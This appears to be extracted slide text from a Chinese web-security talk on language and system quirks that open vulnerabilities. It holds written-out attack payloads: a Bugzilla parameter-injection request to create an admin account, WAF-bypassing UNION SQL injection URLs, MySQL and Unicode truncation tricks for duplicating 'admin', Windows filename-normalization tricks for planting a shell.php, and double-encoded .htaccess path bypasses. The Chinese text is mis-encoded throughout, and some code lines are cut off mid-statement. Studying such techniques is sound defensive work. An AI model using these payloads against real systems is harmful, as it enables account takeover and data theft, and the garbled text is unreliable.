â€¢ è”¡æ”¿è¾¾ a.k.a Orange 
â€¢ CHROOT æˆå‘˜ / HITCON æˆå‘˜ / DEVCORE èµ„å®‰é¡¾é—® 
â€¢ å›½å†…å¤–ç ”è®¨ä¼š HITCON, AVTokyo, WooYun ç­‰è®²å¸ˆ 
â€¢ å›½å†…å¤–éª‡å®¢ç«èµ› Capture the Flag å† å†› 
â€¢ æ­éœ²è¿‡ Microsoft, Django, Yahoo, Facebook, Google ç­‰å¼±
ç‚¹æ¼æ´ 
â€¢ ä¸“ç²¾äºéª‡å®¢â¼¿æ‰‹æ³•ã€Web Security ä¸ç½‘è·¯æ¸—é€ 
#90å #èµ›æ£ #ç”µç«é€‰â¼¿æ‰‹ #æ¸—é€å¸ˆ #Webç‹— #ğŸ¶
â€“ è®² Web å¯ä»¥è®²åˆ°ä½ ä»¬å¬ä¸æ‡‚å°±èµ¢äº†
â€“ â€œâ¿Šé»‘äº†ä½ ï¼Œä»ä¸æ˜¯åœ¨ä½ çŸ¥é“çš„é‚£ä¸ªç‚¹ä¸Šâ€
â€“ æ‘†åœ¨ä½ çœ¼å‰æ˜¯ Featureã€æ‘†åœ¨éª‡å®¢çœ¼å‰å°±æ˜¯æ¼æ´
- åˆ«â¼ˆäººç¬‘æˆ‘å¤ªç–¯ç™«ï¼Œæˆ‘ç¬‘ä»–â¼ˆäººçœ‹ä¸ç©¿
- çŒ¥çâ€œæµâ€
Q: èµ„æ–™åº“ä¸­çš„å¯†ç ç ´ä¸å‡ºæ¥æ€ä¹ˆåŠï¼Ÿ
ç¬¬ä¸‰â½…æ–¹å†…
å®¹å®‰å…¨
å‰ç«¯ 
å®‰å…¨
DNS 
å®‰å…¨
Webåº”â½¤ç”¨ 
å®‰å…¨
Webæ¡†æ¶ 
å®‰å…¨
åç«¯è¯­â¾”è¨€ 
å®‰å…¨
Webä¼ºæœ
å™¨å®‰å…¨
èµ„æ–™åº“ 
å®‰å…¨
ä½œä¸šç³»ç»Ÿ 
å®‰å…¨
XSS
XXE
SQL Injection
CSRF
ç¬¬ä¸‰â½…æ–¹å†…
å®¹å®‰å…¨
å‰ç«¯ 
å®‰å…¨
DNS 
å®‰å…¨
Webåº”â½¤ç”¨ 
å®‰å…¨
Webæ¡†æ¶ 
å®‰å…¨
åç«¯è¯­â¾”è¨€ 
å®‰å…¨
Webä¼ºæœ
å™¨å®‰å…¨
èµ„æ–™åº“ 
å®‰å…¨
ä½œä¸šç³»ç»Ÿ 
å®‰å…¨
Struts2 OGNL RCE
Rails YAML RCE
PHP Memory UAF
XSS
UXSS
Padding Oracle
Padding Oracle
XXE
DNS Hijacking
SQL Injection
Length Extension Attack
ShellShock
HeartBleed
JSONP Hijacking
FastCGI RCE
NPRE RCE
OVERLAYFS Local Root
CSRF
Bit-Flipping Attack
ç¬¬ä¸‰â½…æ–¹å†…
å®¹å®‰å…¨
å‰ç«¯ 
å®‰å…¨
DNS 
å®‰å…¨
Webåº”â½¤ç”¨ 
å®‰å…¨
Webæ¡†æ¶ 
å®‰å…¨
åç«¯è¯­â¾”è¨€ 
å®‰å…¨
Webä¼ºæœ
å™¨å®‰å…¨
èµ„æ–™åº“ 
å®‰å…¨
ä½œä¸šç³»ç»Ÿ 
å®‰å…¨ 
ğŸŒ°
- Perl è¯­â¾”è¨€ç‰¹æ€§å¯¼è‡´ç½‘â¾´é¡µåº”â½¤ç”¨ç¨‹å¼æ¼æ´
ğŸŒ°
@list = ( 'Ba', 'Ba', 'Banana');
$hash = { 'A' => 'Apple', 
          'B' => 'Banana', 
          'C' => @list };
print Dumper($hash); # ?
$hash = { 'A' => 'Apple', 
          'B' => 'Banana', 
          'C' => 'Ba', 
          'Ba' => 'Banana' };
@list = ( 'Ba', 'Ba', 'Banana');
$hash = { 'A' => 'Apple', 
          'B' => 'Banana', 
          'C' => @list };
print Dumper($hash); # wrong!
$hash = { 'A' => 'Apple', 
          'B' => 'Banana', 
          'C' => ('Ba', 'Ba', 'Banana') };
@list = ( 'Ba', 'Ba', 'Banana');
$hash = { 'A' => 'Apple', 
          'B' => 'Banana', 
          'C' => @list };
print Dumper($hash); # correct!
$hash = { 'A' => 'Apple', 
          'B' => 'Banana', 
          'C' => 'Ba', 
          'Ba' => 'Banana' };
my $otheruser = Bugzilla::User->create(
{
    login_name => $login_name,
    realname   => $cgi->param('realname'),
    cryptpassword => $password
});
my $otheruser = Bugzilla::User->create(
{
    login_name => $login_name,
    realname   => $cgi->param('realname'),
    cryptpassword => $password
});
# index.cgi?
realname=xxx&realname=login_name&realname=
admin
- Windows ç‰¹æ€§é€ æˆç½‘â¾´é¡µåº”â½¤ç”¨é™åˆ¶ç»•è¿‡
ğŸŒ°
â€¢ Windows API æ¡£åæ­£è§„åŒ–ç‰¹æ€§
- shell.php # shel>.php # shell"php # shell. System Dir -> Plugin Dir 
â€¢ ç®€å•è¯´å°±æ˜¯åˆ©â½¤ç”¨ into outfile å»ºâ½´ç«‹âº«â½¬ç›®å½•
- INTO OUTFILE 'plugins::$index_allocation' 
- mkdir plugins
â€“ å¯¹ç³»ç»Ÿç‰¹æ€§çš„ä¸äº†è§£ä¼šå¯¼è‡´â€œç—‡çŠ¶è§£â€
â€“ è®²ä¸‰ä¸ªè¾ƒä¸ºæœ‰è¶£å¹¶è¢«â¼ˆäººå¿½ç•¥çš„ç‰¹æ€§ä¸æŠ€å·§
â€¢ é—®é¢˜ç‚¹
- æœªæ­£ç¡®çš„ä½¿â½¤ç”¨æ­£è§„è¡¨â½°ç¤ºå¼å¯¼è‡´â¿Šé»‘åå•è¢«ç»•è¿‡ 
â€¢ èŒƒä¾‹
- WAF ç»•è¿‡ 
- é˜²å¾¡ç»•è¿‡
- ä¸­â½‚æ–‡æ¢â¾è¡Œç¼–ç ç»•è¿‡ç½‘â¾´é¡µåº”â½¤ç”¨é˜²â½•ç«å¢™è§„åˆ™
http://hackme.cc/view.aspx 
?sem=' UNION SELECT(user),null,null,null, 
&noc=,null,null,null,null,null/*ä¸‰*/FROM 
dual--
http://hackme.cc/view.aspx 
?sem=' UNION SELECT(user),null,null,null, 
&noc=,null,null,null,null,null/*ä¸Š*/FROM 
dual--
http://hackme.cc/view.aspx 
?sem=' UNION SELECT(user),null,null,null, 
&noc=,null,null,null,null,null/*ä¸Š*/FROM 
dual--
%u4E0A 
%u4D0A 
...
- ç»•è¿‡é˜²å¾¡é™åˆ¶ç»§ç»­ Exploit
for($i=0; $iPHP 5.3.9)
â€¢ é—®é¢˜ç‚¹
- å¯¹èµ„æ–™ä¸äº†è§£ï¼Œè®¾ç½®äº†é”™è¯¯çš„è¯­ç³»ã€èµ„æ–™å‹æ€ 
â€¢ èŒƒä¾‹
- â¼†äºŒæ¬¡ SQL æ³¨â¼Šå…¥ 
- å­—ç¬¦æˆªæ–­å¯¼è‡´ ...
- è¾“â¼Šå…¥å†…å®¹â¼¤å¤§äºæŒ‡å®šå½¢æ€â¼¤å¤§â¼©å°ä¹‹æˆªæ–­
$name = $_POST['name'];
$r = query('SELECT * FROM users WHERE name=?', $name);
if (count($r) > 0){
  die('duplicated name');
} else {
  query('INSERT INTO users VALUES(?, ?)', $name, $pass);
  die('registed');
}
// CREATE TABLE users(id INT, name VARCHAR(255), ...)
mysql> CREATE TABLE users ( 
    -> id INT,  
    -> name VARCHAR(255),  
    -> pass VARCHAR(255) 
    -> ); 
Query OK, 0 rows affected (0.00 sec) 
mysql> INSERT INTO users VALUES(1, 'admin', 'pass'); 
Query OK, 1 row affected (0.00 sec) 
mysql> INSERT INTO users VALUES(2, 'admin   ...   x', 'xxd'); 
Query OK, 1 row affected, 1 warning (0.00 sec) 
mysql> SELECT * FROM users WHERE name='admin'; 
+------+------------------+------+ 
| id   | name             | pass | 
+------+------------------+------+ 
|    1 | admin            | pass | 
|    2 | admin            | xxd  | 
+------+------------------+------+ 
2 rows in set (0.00 sec)
name: admin   ...   x
[space] x 250
CVE-2009-2762 WordPress 2.6.1 Column Truncation Vulnerability
- CREATE TABLE users (id INT, name TEXT, ...)
CVE-2015-3440 WordPress 4.2.1 Truncation Vulnerability
- Unicode ç¼–ç ä¹‹æˆªæ–­ ğŸŠ
$name = $_POST['name'];
if (strlen($name) > 16)
  die('name too long');
$r = query('SELECT * FROM users WHERE name=?', $name);
if (count($r) > 0){
  die('duplicated name');
} else {
  query('INSERT INTO users VALUES(?, ?)', $name, $pass);
  die('registed');
}
// CREATE TABLE users(id INT, name VARCHAR(255), ...) 
DEFAULT CHARSET=utf8
mysql> CREATE TABLE users ( 
    -> id INT,  
    -> name VARCHAR(255),  
    -> pass VARCHAR(255) 
    -> ) DEFAULT CHARSET=utf8; 
Query OK, 0 rows affected (0.00 sec) 
mysql> INSERT INTO users VALUES(1, 'admin', 'pass'); 
Query OK, 1 row affected (0.01 sec) 
mysql> INSERT INTO users VALUES(2, 'adminğŸŠx', 'xxd'); 
Query OK, 1 row affected, 1 warning (0.00 sec) 
mysql> SELECT * FROM users WHERE name='admin'; 
+------+-------+------+ 
| id   | name  | pass | 
+------+-------+------+ 
|    1 | admin | pass | 
|    2 | admin | xxd  | 
+------+-------+------+ 
2 rows in set (0.00 sec)
name: adminğŸŠx
ğŸŠğŸ±ğŸ¶ğŸğŸ’©
CVE-2013-4338 WordPress , return 403
Apache
http://hackme.cc/admin%252f.htaccess
/admin%2f.htaccess not found, return 404
http://hackme.cc/admin%2f.htaccess
Apache
http://hackme.cc/admin%252f.htaccess%2500.cfm
End with .cfm, pass to ColdFusion
http://hackme.cc/admin%2f.htaccess%00.cfm
ColdFusion
http://hackme.cc/admin/.htaccess .cfm
http://hackme.cc/admin%2f.htaccess%00.cfm